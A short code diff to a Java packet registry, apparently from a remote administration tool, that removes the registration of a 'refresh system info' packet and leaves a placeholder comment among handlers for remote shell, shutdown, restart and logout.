@@ -31,7 +31,7 @@ public abstract class AbstractIncomingPacket {
 		incomingPackets.put((byte) 24, Packet24RemoteShellStop.class);
 		incomingPackets.put((byte) 25, Packet25RemoteShellExecute.class);
 		incomingPackets.put((byte) 26, Packet26StopRemoteScreen.class);
-		incomingPackets.put((byte) 27, Packet27RefreshSystemInfo.class);
+		// 27
 		incomingPackets.put((byte) 28, Packet28ShutdownComputer.class);
 		incomingPackets.put((byte) 29, Packet29RestartComputer.class);
 		incomingPackets.put((byte) 30, Packet30LogoutComputer.class);
